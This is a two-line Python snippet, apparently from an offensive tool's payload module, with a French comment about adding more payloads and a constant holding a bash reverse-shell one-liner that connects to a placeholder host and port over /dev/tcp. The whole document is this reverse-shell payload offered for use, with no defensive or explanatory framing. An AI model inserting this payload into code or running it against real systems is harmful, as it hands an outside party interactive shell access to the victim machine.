# A l'avenir, nous pourrions mettre différents payloads
REVERSE_TCP_SHELL = """/bin/bash -i &gt;&amp; /dev/tcp/{}/{} 0&gt;&amp;1"""
